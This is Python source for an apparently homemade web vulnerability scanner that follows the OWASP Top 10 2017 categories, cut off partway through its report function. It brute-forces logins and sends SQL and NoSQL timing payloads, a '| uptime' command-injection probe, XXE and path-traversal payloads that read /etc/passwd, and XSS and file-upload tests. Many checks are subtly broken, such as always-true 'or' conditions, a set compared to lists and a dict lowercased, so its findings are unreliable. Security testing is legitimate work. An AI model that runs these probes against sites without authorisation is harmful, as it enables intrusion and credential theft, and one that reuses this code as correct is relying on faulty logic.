import requests
import re
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup
import os
import queue
import socket
import ssl
from datetime import datetime
from configparser import ConfigParser

config_object = ConfigParser()
config_object.read("config.ini")


server_list = set()

linux_servers = ["apache", "nginx", "caddy", "openlitespeed", "hiawatha"]
windows_servers = ["IIS"]
mixed_servers = ["nodejs", "lighttpd"]
privilege_data = ["groupID=grp001&orderID=0001", "grpID=2&item=1", "grp=group1", "role=5"]

sql_injection_dict_normal = {}
sql_injection_dict_injected = {}
nosql_injection_dict_normal = {}
nosql_injection_dict_injected = {}

links_potential_role_definition = []
links_vulnerable_to_lfi = []
links_without_secure_cookie_with_sessid = []
links_browser_cache_weakness = []
links_lfi_directory_transversal = []
links_cookie_directory_transversal = []
links_bypass_authorization = []
links_special_header = []
links_xee_vuln = []
links_xss_link = []
links_privilege_escal = []
links_idor = []

links_forms_dict_xss = {}
links_forms_dict_file_upload = {}
links_forms_dict_code_exec = {}
links_forms_dict_sql_injection = {}
links_forms_dict_nosql_injection = {}
links_forms__dict_sensitive_info = {}
links_forms_files_in_form = {}
final_list = []
session_id = ""
prev_session_id = ""


class OtherUser:

    def __init__(self, user, password, url=None):
        self.url = url
        self.session = requests.Session()
        self.http = self.session.post(
            config_object["WEBURL"]["login"],
            data={
                config_object["CREDENTIAL"]["username_field"]: user,
                config_object["CREDENTIAL"]["password_field"]: password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )

    def save_cookies(self, url):
        self.session.get(url)
        session_cookies = self.session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def get_sess_id(self):
        global session_id
        self.session.get(self.url)
        cookie_dict = self.save_cookies(self.url)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                session_id = cookie_dict[key]
                self.session.close()
                return session_id


class LoginTests:
    def __init__(self, user, login_url, pass_file, wrong_username, good_password, certain_wrong_passwd, logout_url, file_for_report):
        self.username = user
        self.password_found = False
        self.login_url = login_url
        self.logged_in = False
        self.pass_file = pass_file
        self.password = None
        self.wrong_un = wrong_username
        self.wrong_passwords = certain_wrong_passwd
        self.credentials_error_vuln = False
        self.good_password = good_password
        self.session = requests.session()
        self.logout_url = logout_url
        self.report_file = file_for_report

        self.test_lockout()
        self.test_account_enum()
        self.test_brute_force()

    def brute_force(self):
        with open(config_object["FILE"]["password_dict"], "rb") as f:
            pass_list = f.readlines()
            f.close()
        pass_q = queue.Queue()
        if len(pass_list):
            for passwd in pass_list:
                try:
                    passwd = passwd.decode("utf-8").rstrip()
                    pass_q.put(passwd)
                except Exception as e:
                    print(e)
                    passwd = passwd.decode("latin-1").rstrip()
                    pass_q.put(passwd)

        for pass_word in pass_q.queue:
            http = requests.post(
                self.login_url,
                data={
                    config_object["CREDENTIAL"]["username_field"]: self.username,
                    config_object["CREDENTIAL"]["password_field"]: pass_word,
                    config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
                }
            )
            if http.url == config_object["WEBURL"]["index"]:
                self.password = pass_word
                self.password_found = True
                return 1
        return 0

    def account_enumeration(self):
        print("Checking for Account Enumeration and Possible Guessable Users...", file=self.report_file)
        wrong_password_res = requests.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.username,
                config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        wrong_password_res_content = str(wrong_password_res.content)
        wrong_username_res = requests.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.wrong_un,
                config_object["CREDENTIAL"]["password_field"]: self.good_password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        wrong_username_req_content = str(wrong_username_res.content)
        if wrong_username_req_content != wrong_password_res_content:
            return 1
        return 0

    def get_correct_password(self):
        if self.password_found:
            return self.password
        return False

    def check_login_attempts(self, n):
        self.session = requests.session()
        for i in range(n):
            self.session.post(
                self.login_url,
                data={
                    config_object["CREDENTIAL"]["username_field"]: self.username,
                    config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords[0],
                    config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
                }
            )
        correct_login = self.session.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.username,
                config_object["CREDENTIAL"]["password_field"]: self.good_password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        if correct_login.url == config_object["WEBURL"]["index"]:
            self.session.post(self.logout_url)
            self.session.close()
            print("[!!!-!!!] Wrong Password Lock Out Mechanism not triggered after ", n, " times", file=self.report_file)
            return 1
        return 0

    def test_lockout(self):
        if self.check_login_attempts(int(config_object["TEST"]["lock_out_mechanism_attempts"])):
            print("[!!!-!!!] Weak Lockout Mechanism found for a number of invalid password attempts", file=self.report_file)
        else:
            print("OK! Wrong Password Lock Out Mechanism detected", file=self.report_file)

    def test_account_enum(self):
        if self.account_enumeration():
            print(
                "[!!!-!!!] It s possible that the login error message provides useful information about login credentials!"
                " Make sure the error message is the same for any invalid credentials case!",  file=self.report_file
            )
        else:
            print("OK! No accounts can be enumerated", file=self.report_file)

    def test_brute_force(self):
        if self.brute_force():
            print("[!!!---!!!] Brute Force attack successful!!" + "\nUsername: " + self.username + "\n" + "Found password: " + self.password, file=self.report_file)
            print("\t\t[END LOGIN REPORT]", file=self.report_file)


class Scanner:
    def __init__(self, url, ignored_links, file_for_report, file_for_mapping_app):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.ignored_links = ignored_links
        self.cookie_list = []
        self.visited = []
        self.report_file = file_for_report
        self.map_file = file_for_mapping_app

    # Utilities ---------@
    def extract_links(self, url):
        response = self.session.get(url)
        return re.findall(
            '(?:href=")(.*?)"',
            str(response.content)
        )

    def spider(self, url=None):
        if url is None:
            url = self.target_url
        extracted_links = self.extract_links(str(url))
        for extracted_link in extracted_links:
            extracted_link = urllib.parse.urljoin(url, extracted_link)
            if "#" in extracted_link:
                extracted_link = extracted_link.split("#")[0]
            if self.target_url in extracted_link and extracted_link not in self.target_links and extracted_link not in self.ignored_links and len(self.target_links) <= int(config_object['TEST']['max_number_of_not_hidden_links']):
                print(extracted_link, file=self.map_file)
                self.target_links.append(extracted_link)
                self.spider(extracted_link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, "html.parser", from_encoding="iso-8859-1")
        return parsed_html.findAll("form")

    def check_response(self, url):
        try:
            if self.session.post(url).status_code == 200:
                return True
            elif self.session.get(url).status_code == 200:
                return True
            elif str(self.session.get(url).status_code).startswith("3"):
                return True
        except Exception as e:
            if "toomanyredirects" in str(e).lower():
                print("\n[WARN] Got too many redirects from an URL. This can be ignored.", file=self.report_file)
                pass
            else:
                return False
        return False

    def submit_form(self, form, value, url, files=None):  # needs changing
        action = form.get("action")
        post_url = urllib.parse.urljoin(url, action)
        method = form.get("method")
        inputs_list = form.findAll("input")
        post_data_dict = {}
        for inputs in inputs_list:
            input_name = inputs.get("name")
            input_type = inputs.get("type")
            input_value = inputs.get("value")

            if input_type == "text":
                input_value = value
            post_data_dict[input_name] = input_value
        if method.lower() == "post":
            return self.session.post(post_url, files=files, data=post_data_dict)
        return self.session.get(post_url, params=post_data_dict)

    def save_cookies(self, url, session=None):
        if session is None:
            self.session.get(url)
            session_cookies = self.session.cookies
        else:
            session_cookies = session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def check_hidden_path(self, path):
        response = self.session.get(self.target_url + path)
        if response == 200:
            return True
        return False

    def get_headers(self, url):
        return self.session.get(url).headers

    def get_content(self, url, sess=None):
        if sess is None:
            response = self.session.get(url)
        else:
            response = sess.get(url)
        return response

# Get Info
    def fingerprint(self, url):
        global server_list
        header_for_link = self.get_headers(url)
        server_list.add(header_for_link["Server"])

# Vulnerabilities

    # A1:2017-Injection

    def test_sql(self, form, url):
        global sql_injection_dict_injected, sql_injection_dict_normal
        sql_no_payload = ""
        response_wh_payload = self.submit_form(form, sql_no_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        sql_detect_payload = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1))," \
                             "SLEEP(0.5))/*'XOR(IF(SUBSTR(@@version,1,1)<5," \
                             "BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5," \
                             "BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'*/"  # detectify https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
        response_w_payload = self.submit_form(form, sql_detect_payload, url)
        sql_response_time = response_w_payload.elapsed.total_seconds()

        if sql_response_time > normal_response_time and sql_response_time > 1:
            sql_injection_dict_normal[url] = normal_response_time
            sql_injection_dict_injected[url] = sql_response_time
            return True
        return False

    def test_nosql(self, form, url):
        global nosql_injection_dict_normal, nosql_injection_dict_injected
        no_nosql_payload = ""
        response_wh_payload = self.submit_form(form, no_nosql_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        nosql_detect_payload = "';sleep(5000); ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"  # https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/
        response_w_payload = self.submit_form(form, nosql_detect_payload, url)
        nosql_response_time = response_w_payload.elapsed.total_seconds()

        if nosql_response_time > normal_response_time and nosql_response_time > 1:
            nosql_injection_dict_normal[url] = normal_response_time
            nosql_injection_dict_injected[url] = nosql_response_time
            return True
        return False

    def code_exec(self, form, url):
        code_exec_script = "| uptime"
        response = self.submit_form(form, code_exec_script, url)
        return re.findall('\d\d:\d\d:\d\d', str(response.content))

    # A2:2017-Broken Authentication:
    # Above Class(LoginTestsVulns)

    def test_role_definition_cookie(self, url):
        cookie_dict = self.save_cookies(url)
        if "isadmin" in str(cookie_dict).lower():

            if str(cookie_dict.lower()["isAdmin"]).lower() == "true" or\
                    str(cookie_dict.lower()["isAdministrator"]).lower() == "true" or\
                    str(cookie_dict.lower()["admin"]).lower() == "true" or\
                    str(cookie_dict.lower()["administrator"]).lower() == "true":
                return 1
        if "role" in str(cookie_dict).lower():

            if str(cookie_dict.lower()["role"]).lower() == "admin" or\
                    str(cookie_dict.lower()["role"]).lower() == "administrator" or\
                    str(cookie_dict.lower()["role"]).lower() == "manager" or\
                    str(cookie_dict.lower()["role"]).lower() == "auditor" or\
                    str(cookie_dict.lower()["role"]).lower() == "mod":
                return 1
        return 0

    def search_paths(self):
        with open(config_object["FILE"]["hidden_url_dict"], "r") as file:
            paths = file.read().split("\n")
        for path in paths:
            try:
                if self.target_url + path not in self.visited and\
                        self.target_url + path not in self.ignored_links and\
                        self.target_url + path not in self.target_links and\
                        "logout" not in self.target_url + path and\
                        len(self.visited) <= int(config_object['TEST']['max_number_of_hidden_links']):
                    response = self.session.get(self.target_url + path)
                    if response.status_code == 200:
                        link_visited = self.target_url + path
                        self.visited.append(str(link_visited))
            except Exception as e:
                print(e)
                continue
        if self.visited:
            return 1
        return 0

    def test_role_definition_directories(self):
        hidden_dir = []
        for link in self.visited+self.target_links:
            link = link.lower()
            if "/admin" in link or "/administrator" in link or "/mod" in link or "/moderator" in link:
                hidden_dir.append(link)
        if hidden_dir:
            return hidden_dir
        return 0

    def check_session_url(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid=" or "sessionid=" in str(url).lower():
            print("\n[?????-!!!!!]Possible SessionID Hijacking for link:" + url, file=self.report_file)
            print("\nSearching for proper SessionID storage on cookies...", file=self.report_file)
            if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
                if not str(cookie_dict.lower()["secure"]) or str(cookie_dict.lower()["httpOnly"]):
                    print("\n[!!!-!!!]Cookie Session not secure...(HTTP only)", file=self.report_file)
                    return True
        return False

    def check_session_id(self, url):
        global session_id, prev_session_id
        if "sid=" in str(url).lower():
            session_id = url.split("sid=", 1)[1]
        elif "sessionid=" in str(url).lower():
            session_id = url.split("sessionid=", 1)[1]

        if session_id != prev_session_id:
            if self.check_session_url(url):
                prev_session_id = session_id
                return True
        return False

    def test_browser_cache_weakness(self, url):
        response = self.session.get(url)
        if "Cache-Control" in str(response.headers):
            if (response.headers["Cache-Control"] != "no-store" and
                response.headers["Cache-Control"] == "no-cache, must-revalidate") or\
                    (response.headers["Cache-Control"] == "no-store" and
                     response.headers["Cache-Control"] != "no-cache, must-revalidate"):
                return False
        return True

    # A3:2017-Sensitive Data Exposure
    # checking certificate...
    def check_tls(self, to_check=None):  # needs change
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target_url, 443)) as sockk:
                with context.wrap_socket(sockk, server_hostname=self.target_url) as tlssock:
                    y = getattr(tlssock, to_check)
                    return y()
        except Exception as e:
            print("Something went wrong in checking TLS. Error: ", e, file=self.report_file)
            pass

    def check_tls_version(self):
        print("\nChecking TLS extensions version...", file=self.report_file)
        try:
            version = self.check_tls("version")
            if version:
                found = True
            else:
                found = False
            legacy_tls = [x.strip() for x in config_object["TLSVERSION"]["tlsversion"].split(',')]
            for legacy in legacy_tls:
                if str(version).lower() == legacy:
                    print(version.lower, file=self.report_file)
                    print(
                        "[!!!-!!!] Found Legacy Version for TLS extension, this version contains cryptographic weaknesses: " + str(
                            version), file=self.report_file)
            if not found:
                print("[???-???] Cannot find the version of the TLS extension...", file=self.report_file)
        except Exception as e:
            print("[???-???] Cannot find the version of the TLS extension. Error: ", e, file=self.report_file)
            pass

    def check_tls_validity(self):
        try:
            print("\nChecking Validity of Digital Certificate...", file=self.report_file)
            sep = " "
            stripped = self.check_tls("getpeercert")["notAfter"].split(sep, -1)[:-1]
            str1 = " "
            good_date = str1.join(stripped)
            date_time_obj = datetime.strptime(good_date, '%b %d %H:%M:%S %Y')
            print("Certificate expires in: ", date_time_obj-datetime.today(), file=self.report_file)
        except Exception as e:
            print("[???-???] Cannot find validity for the TLS extension. Error: ", e, file=self.report_file)
            pass

    def check_secure_tag_cookie_sessid(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
            if "secure" or not "httponly" not in str(cookie_dict).lower() or not "secure" and "httponly" not in str(cookie_dict).lower():
                return True
        return False

    @staticmethod
    def check_form_action(form):
        action = form.get("action")
        if "http" in action and "https" not in action:
            return True
        return False

    # A4:2017-XML External Entities (XXE) https://blog.cobalt.io/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16

    def detect_xml(self, url):
        response = self.session.get(url)
        if ".xml" in url.lower() or "?xml" in str(response.text).lower():
            return 1
        return 0

    def inject_xml(self, url):
        list_of_xee = ['<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://www.google.com"> ]>', '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://www.google.com"> %xxe; ]>']
        if self.detect_xml(url):
            for xee in list_of_xee:
                response = self.session.post(url, data=xee)
                if response.url == 'https://www.google.com':
                    return 1
                elif 'root' == str(response.text).lower():
                    return 1
            return 0

    # A5:2017-Broken Access Control
        # Directory Traversal File Include # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi
    def lfi_script(self, url, script):
        lfi_script = script
        url = url.replace("=", "=" + lfi_script)
        if "root:" in self.get_content(url).text.lower():
            return 1
        return 0

    def rfi_script(self, url, script):
        rfi_script = script
        url = url.replace("=", "=" + rfi_script)
        if self.get_content(url).url != url:
            return 1
        return 0

    def test_lfi_directory_transversal(self, url):
        if self.local_file_inclusion(url):
            return 1
        if "=" in url:
            if server_list in linux_servers or server_list in mixed_servers:
                if self.lfi_script(url, "../../../etc/passwd") or \
                        self.lfi_script(url, "../../../etc/passwd%00") or \
                        self.lfi_script(url, "%252e%252e%252fetc%252fpasswd") or \
                        self.lfi_script(url, "%252e%252e%252fetc%252fpasswd%00") or \
                        self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd") or \
                        self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00") or \
                        self.lfi_script(url, "....//....//etc/passwd") or \
                        self.lfi_script(url, "..///////..////..//////etc/passwd") or \
                        self.lfi_script(url, "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"):
                    return 1
            elif server_list in windows_servers in mixed_servers:
                if self.lfi_script(url, "../") or \
                        self.lfi_script(url, "..\/") or \
                        self.lfi_script(url, "%2e%2e%2f") or \
                        self.lfi_script(url, "%252e%252e%252f") or \
                        self.lfi_script(url, "%c0%ae%c0%ae%c0%af") or \
                        self.lfi_script(url, "%uff0e%uff0e%u2215") or \
                        self.lfi_script(url, "%uff0e%uff0e%u2216") or \
                        self.lfi_script(url, "..././"):
                    return 1
            if self.rfi_script(url, "https://www.google.com/"):
                return 1
        return 0

    def test_cookie_directory_transversal(self, url):
        # self.session.get(url)
        dummy_session = OtherUser(config_object["CREDENTIAL"]["username_2"], config_object["CREDENTIAL"]["known_password_2"]).session
        cookie_dict = self.save_cookies(url, dummy_session)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            dummy_session.cookies.set(key, "../")
            if self.get_content(url, dummy_session).url is not url:
                dummy_session.close()
                return 1
        return 0

        # Bypassing Authorization Schema
        # Horizontal

    def test_bypass_auth(self, url):
        if config_object["WEBURL"]["private_info_url"] == "None":
            return
        first_user_session_id = None
        second_user_session_id = None
        response_first_user = None
        response_second_user = None
        dummy_user = OtherUser(config_object["CREDENTIAL"]["username_2"],
                               config_object["CREDENTIAL"]["known_password_2"], url)
        dummy_session = dummy_user.session
        dummy_session.get(url)
        cookie_dict = self.save_cookies(url, dummy_session)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                first_user_session_id = cookie_dict[key]
            else:
                return 0

        if first_user_session_id:
            second_user_session_id = dummy_user.get_sess_id()
        if second_user_session_id:
            data = {
                config_object["CREDENTIAL"]["username_field"]: config_object["CREDENTIAL"]["username"]
            }
            response_first_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
            for key in key_list:
                if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                    dummy_session.cookies.set(key, second_user_session_id)
            response_second_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
        if response_first_user and response_second_user:
            if str(response_first_user.text) == str(response_second_user.text):
                return 1
        return 0

        # Vertical ~SOON~

        # Special Request Header

    def test_special_req_header(self, url):
        response_wo_headers = self.session.get(url)
        response_w_x_original = self.session.get(url, headers={"X-Original-URL": "/donotexistrandomstring1238123"})
        response_w_x_rewrite = self.session.get(url, headers={"X-Rewrite-URL": "/donotexistrandomstring1238123"})
        if response_wo_headers.status_code == 404 or response_w_x_original.status_code == 404 or response_w_x_rewrite.status_code == 404:
            return 1
        return 0

        # Privilege Escalation

    def test_privilege_escalation(self, url):
        try:
            response = self.session.get(url)
            if "grp" or "group" or "role" in str(response.text).lower() or "grp" or "group" or "role" in response.url.lower():
                for data in privilege_data:
                    response = self.session.post(url, data=data)
                    if response.status_code != 401:
                        return 1
            if "X-Forwarded-For:" in response.headers:
                print("\n[WARN] X-Forwarded-For header present on link: ", file=self.report_file)
                print(url, file=self.report_file)
                print("Hackers may change the IP value!", file=self.report_file)
            return 0
        except Exception as e:
            print(e)
            pass

    # Insecure Direct Object References
    def test_idor(self, url):
        attempts = 0
        sub_string = re.findall('[?](.*)[=]*\d', url)
        if sub_string:
            index_from_url = int(str(re.findall('\d', str(sub_string))))
            response = self.session.get(url)
            while attempts < 10:
                try:
                    url.replace(str(index_from_url), index_from_url + 1)
                    response_2 = self.session.get(url)
                    if response != response_2 and str(response_2.status_code).startswith("2"):
                        return 1
                except Exception as e:
                    print(e)
                    index_from_url += 1
                    attempts += 1
        return 0
    # A6:2017-Security Misconfiguration
    # Test File Extensions Handling for Sensitive Information
    # Present Extensions (analize robots.txt)

    def search_extensions_robots(self):  # https://github.com/danielmiessler/RobotsDisallowed/blob/master/top1000.txt
        f = open("robots.txt", "r")
        print("\nAnalyzing robots.txt for interesting urls..!", file=self.report_file)
        potential_display = []
        unwanted_display_of_url = []
        dir_list = [line.strip() for line in f.readlines()]
        robots_url = str(config_object["WEBURL"]["target"]) + "/robots.txt"
        req_robots = self.session.get(robots_url)
        robots_urls = re.findall('(?:Disallow: )(.*)', req_robots.text)
        if not len(robots_urls) <= 3:
            print("Directories ignored by search engines:", file=self.report_file)
            print(*robots_urls, sep="\n", file=self.report_file)
        else:
            print("No directories found inside robots.txt", file=self.report_file)
            return
        print("Testing for something interesting...", file=self.report_file)
        for item in dir_list:
            if item in robots_urls:
                potential_display.append(item)
            check_disallow_url = str(config_object["WEBURL"]["target"]) + str(item)
            if self.check_response(check_disallow_url):
                unwanted_display_of_url.append(check_disallow_url)
        if potential_display:
            print("[!!!-!!!]Potential display of sensitive information found in robots.txt: ", file=self.report_file)
            print(*potential_display, sep="\n")
        if unwanted_display_of_url:
            print("[!!!-???]Got OK response from the following URLs. Sensitive information might be revealed. Manual check needed: ", file=self.report_file)
            print(*unwanted_display_of_url, sep="\n", file=self.report_file)
        if not potential_display or not unwanted_display_of_url:
            print("[END]Nothing interesting found on robots.txt. It may be empty.", file=self.report_file)
        print("[END] End of analyzing robots.txt", file=self.report_file)

    # Form present extensions

    @staticmethod
    def check_forms_files(form):
        action = form.get("action")
        if "." in action and '/' not in action and '\\' not in action:
            inputs_list = form.findAll("input", type='hidden')
            for inputs in inputs_list:
                input_type = inputs.get("type")
                if str(input_type).lower() == "hidden":
                    return True
        return False

    # HTTP Methodes

    def test_http(self):
        test_data = {"test": 'test'}
        response = self.session.put(str(config_object['WEBURL']['target']) + '/test.html', data=test_data)
        if str(response.status_code).startswith("3") or str(response.status_code).startswith("2"):
            return True
        return False

    # HTTP Strict Transport Security

    def test_hsts(self):
        headers = self.get_headers(config_object['WEBURL']['target'])
        if 'strict' not in str(headers).lower():
            return True
        return False

    # Test RIA

    def test_ria(self, link_list):
        content = None
        for link in link_list:
            if 'clientaccesspolicy.xml' in link.lower() or 'crossdomain.xml' in link.lower():
                content = self.session.get(link)
                break
        try:
            if '*' in content:
                return True
        except TypeError:
            pass
        return False

    # File Upload Vulnerability Extension

    @staticmethod  # creates unharmful files
    def create_file_dir(subdir):
        filenames = ["filefortest.php", "fIleForTest.Php.JpEG", "fiL3ForTest.hTMl.JPG", "shell.phPWND", "fIleForTest.eXe.jsp"]
        here = os.path.dirname(os.path.realpath(__file__))
        if not os.path.exists(os.path.join(here, subdir)):
            os.mkdir(os.path.join(here, subdir))
        for filename in filenames:
            if not os.path.isfile("./" + filename):
                filepath = os.path.join(here, subdir, filename)
                test_file = open(filepath, 'w+')
                test_file.write("This is unharmful content to be uploaded to the site")
                test_file.close()

    def file_upload(self, form, url):
        is_file = False
        inputs_list = form.find_all("inputs")
        response = self.get_content(url)
        if 'multipart/form-data' in str(response.content).lower():
            is_file = True
        for inputs in inputs_list:
            if inputs.get("type").lower() == "file":
                is_file = True
        if is_file is True:
            self.create_file_dir("Files")
            cur_path = os.path.join(os.path.dirname(__file__), 'Files')
            dir_listing = os.listdir(cur_path)
            os.chdir(cur_path)
            for i in dir_listing:
                path_for_file = os.path.relpath('..\\Files\\' + i, cur_path)
                f = open(path_for_file, 'rb')
                files = {'uploaded': f}
                if self.submit_form(form, "value", url, files).status_code == 200:
                    os.chdir('..')
                    return True
            os.chdir('..')
            return False

    # Test XSS

    def test_xss_in_link(self, url):
        xss_test_script = "<sCriPt>alert('test')</sCRiPt>"
        url = url.replace("=", "=" + xss_test_script)
        response = self.session.get(url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    def test_xss_in_form(self, form, url):
        xss_test_script = "<sCriPt>alert('test')</sCRiPt>"
        response = self.submit_form(form, xss_test_script, url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    # Test LFI

    def local_file_inclusion(self, url):
        lfi_script = "~"
        url = url.replace("=", "=" + lfi_script)
        if self.check_response(url):
            return True
        return False

    # MISC

    def hidden_paths(self):
        if self.search_paths():
            print("Possible Hidden Paths Found:\n", file=self.map_file)
            print(*self.visited, sep="\n", file=self.map_file)

    def admin_directories(self):
        links_admin_path = []
        has_admin_directories = self.test_role_definition_directories()
        if has_admin_directories:
            for link in has_admin_directories:
                links_admin_path.append(link)
            print("\n[!!!---???] Possible Admin Path discovered for links:", file=self.report_file)
            print(*links_admin_path, sep="\n", file=self.report_file)
            print("[END] End of admin paths", file=self.report_file)

    def create_return_merge_links(self):
        global final_list
        visible_links = len(self.target_links)
        invisible_links_length = len(self.visited)
        print("\nVisible Links Length:", visible_links, "\nHidden Links Length:", invisible_links_length, file=self.report_file)
        final_list = self.target_links + self.visited
        print("\n[!!!-!!!] Performing tests on NOT hidden links", file=self.report_file)
        return visible_links, final_list

    def gather_info(self, url=None):
        if not url:
            print("\n                   ############################# Web Application Architecture #############################", file=self.map_file)
            print("\nFound links in this order:\n", file=self.map_file)
            self.spider()
            print("[END] End of visible links found!", file=self.map_file)
            print("\n\nStarting search for hidden links..", file=self.map_file)
            self.hidden_paths()
            print("[END] End of hidden links found!\n", file=self.map_file)
        else:
            self.fingerprint(url)

    # Test Suit Classifier

    def test_injections(self, url, form=None, test=False):
        if test:
            if form and url:
                if self.test_xss_in_form(form, url):
                    links_forms_dict_xss[url] = form
                if self.test_sql(form, url):
                    links_forms_dict_sql_injection[url] = form
                if self.code_exec(form, url):
                    links_forms_dict_code_exec[url] = form
                if self.test_nosql(form, url):
                    links_forms_dict_nosql_injection[url] = form
            if "=" in url and not form:
                if self.test_xss_in_link(url):
                    links_xss_link.append(url)

    def test_broken_auth(self, url=None, test=False):
        if test:
            if not url:
                self.admin_directories()
            else:
                if "=" in url:
                    if self.check_session_id(url):
                        print("\n[!!!-!!!]SessionID Hijack Vulnerability found", file=self.report_file)
                    if self.local_file_inclusion(url):
                        links_vulnerable_to_lfi.append(url)
                else:
                    if self.test_role_definition_cookie(url):
                        links_potential_role_definition.append(url)
                    if self.test_browser_cache_weakness(url):
                        links_browser_cache_weakness.append(url)

    def test_sensitive_data_exposure(self, url=None, form=None, test=False):
        if test:
            if not url:
                self.check_tls_version()
                self.check_tls_validity()
            else:
                if form:
                    if self.check_form_action(form):
                        links_forms__dict_sensitive_info[url] = form
                elif self.check_secure_tag_cookie_sessid(url):
                    links_without_secure_cookie_with_sessid.append(url)

    def test_xml_external_entities(self, url=None, test=False):
        if test:
            if self.inject_xml(url):
                links_xee_vuln.append(url)

    def test_broken_access_control(self, url=None, test=False):
        if test:
            if '=' in url:
                if self.test_idor(url):
                    links_idor.append(url)
            else:
                if self.test_lfi_directory_transversal(url):
                    links_lfi_directory_transversal.append(url)
                if self.test_cookie_directory_transversal(url):
                    links_cookie_directory_transversal.append(url)
                if self.test_special_req_header(url):
                    links_special_header.append(url)
                if self.test_bypass_auth(url):
                    links_bypass_authorization.append(url)
                if self.test_privilege_escalation(url):
                    links_privilege_escal.append(url)

    def test_security_misconfiguration(self, url=None, form=None, test=False):
        if test:
            if not url:
                self.search_extensions_robots()
                if self.test_http():
                    print("\n[!!!---!!!] HTTP PUT Method got OK status. Application might be vulnerable!", file=self.report_file)
                if self.test_hsts():
                    print(
                        "\n[!!!---!!!] HTTP Strict Transport Security NOT found. Application is vulnerable to sniffing and certificate invalidation vulnerability!", file=self.report_file)
                if self.test_ria(final_list):
                    print(
                        "\n[!!!---???] Overly permissive policy file found. Tester must review Crossdomain.xml / Clientaccesspolicy.xml", file=self.report_file)
            else:
                if form:
                    if self.check_forms_files(form):
                        links_forms_files_in_form[url] = form
                    if self.file_upload(form, url):
                        links_forms_dict_file_upload[url] = form

    # Print Info Method

    def print_report(self):

        if server_list:
            print("\n\t\t[DETALIED REPORT]\n", file=self.report_file)
            print("\nServer/s Found: ", file=self.report_file)
            print(*server_list, sep="\n", file=self.report_file)

        if not links_potential_role_definition:
            print("\n\n[???---???] Possible non-existing cookies with role storage...", file=self.report_file)
        else:
            print("\n[!!!---???] Possible Role Definition Vulnerability on Cookies for links:\n", file=self.report_file)
            print(*links_potential_role_definition, sep="\n", file=self.report_file)
            print("[END] End of Role Definition Vulnerable links", file=self.report_file)

        if links_without_secure_cookie_with_sessid:
            print(
                "\n[!!!---!!!] Session ID Set in Cookie but cookie is not secure. It can be sent over unencrypted channels (HTTP) Links:\n", file=self.report_file)
            print(*links_without_secure_cookie_with_sessid, sep="\n", file=self.report_file)
            print("[END] End of Insecure Cookie With Session ID SET", file=self.report_file)

        if links_privilege_escal:
            print("\n[!!!---!!!] Application is vulnerable to Vertical Privilege Escalation on links:\n", file=self.report_file)
            print(*links_privilege_escal, sep="\n", file=self.report_file)
            print("[END] End of Vertical Privilege Escalation vulnerable links", file=self.report_file)

        if links_browser_cache_weakness:
            print("\n[!!!---!!!] Browser Cache Weakness Vulnerability on links:\n", file=self.report_file)
            print(*links_browser_cache_weakness, sep="\n", file=self.report_file)
            print("[END] End of Browser Cache Weakness Vulnerability", file=self.report_file)

        if links_vulnerable_to_lfi:
            print("\n[!!!---!!!] Local File Inclusion Vulnerability on links:\n", file=self.report_file)
            print(*links_vulnerable_to_lfi, sep="\n", file=self.report_file)
